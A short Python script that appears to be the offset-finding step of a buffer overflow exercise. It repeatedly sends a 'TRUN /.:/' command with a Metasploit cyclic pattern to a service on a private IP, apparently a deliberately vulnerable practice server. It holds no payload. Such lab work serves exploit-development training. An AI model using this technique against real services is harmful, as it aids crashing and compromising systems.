#!/usr/bin/python3

import sys, socket

host = '172.16.10.101'
port = 9999
offset_file = 'pattern1.rb'

def read_file(file):
	try:
		with open(file, 'r') as file:
			file = file.read()
	
		return file.strip()
	
	except FileNotFoundError as err:
		print(err)
		sys.exit()
		

def find_offset(host, port, offset):

	while True:
		try:
			s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))

			# Send generated pattern.rb from metasploit framework
			s.send(('TRUN /.:/' + offset).encode('ascii'))
			s.close()
	
		except:
			print("Error connecting to the server..")
			sys.exit()


if __name__ == '__main__':
	find_offset(host, port, read_file(offset_file))
